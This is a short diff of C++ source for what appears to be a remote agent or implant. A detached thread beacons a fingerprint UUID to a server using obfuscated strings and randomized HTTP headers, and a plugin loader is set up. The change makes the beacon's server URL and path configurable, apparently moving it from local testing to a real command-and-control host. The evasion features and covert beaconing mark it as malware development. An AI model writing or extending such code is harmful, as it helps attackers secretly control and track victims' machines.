@@ -17,7 +17,7 @@ static void heartbeat(const std::string& server) {
     if(!curl) return;
     g_header_randomizer.apply(curl);
     while(true) {
-        std::string url = server + OBFUSCATE("/heartbeat");
+        std::string url = server + g_agent_config.path_prefix + OBFUSCATE("/heartbeat");
         std::string payload = "{\"uuid\":\"" + g_uuid + "\"}";
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
@@ -32,7 +32,7 @@ static void heartbeat(const std::string& server) {
 int main() {
     auto fp = collect_fingerprint();
     g_uuid = fp.uuid;
-    std::thread hb(heartbeat, OBFUSCATE("http://localhost:5000"));
+    std::thread hb(heartbeat, g_agent_config.server_url);
     hb.detach();
 
     Loader clearLoader(OBFUSCATE("./plugins"), "");
